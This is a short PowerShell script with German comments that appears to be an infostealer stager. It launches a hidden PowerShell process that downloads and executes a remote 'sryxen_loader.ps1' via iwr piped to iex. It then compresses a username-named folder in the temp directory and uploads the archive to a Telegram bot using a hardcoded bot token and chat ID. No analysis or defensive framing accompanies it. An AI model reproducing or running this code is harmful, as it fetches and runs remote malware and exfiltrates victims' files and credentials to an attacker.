# Lade die System.Net.Http-Assembly, um die benötigten Typen zur Verfügung zu stellen
Add-Type -AssemblyName "System.Net.Http"

# Originalskript
Start-Process powershell -ArgumentList "-Command iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex" -WindowStyle Hidden -Wait
$userName=$env:USERNAME
$archivePath=[System.IO.Path]::GetTempPath()+$userName+'.zip'
Compress-Archive -Path ([System.IO.Path]::GetTempPath()+$userName) -DestinationPath $archivePath -Force
$botToken="7509500670:AAG-K0ttSzKTAJQYdktdqINU2qEdpKJ0UZw"
$chatId="6170268179"
$telegramApiUrl="https://api.telegram.org/bot$botToken/sendDocument"
$multipartContent=New-Object System.Net.Http.MultipartFormDataContent
$multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)),"chat_id")
$multipartContent.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($archivePath))),"document",[System.IO.Path]::GetFileName($archivePath))
(New-Object System.Net.Http.HttpClient).PostAsync($telegramApiUrl,$multipartContent).Result
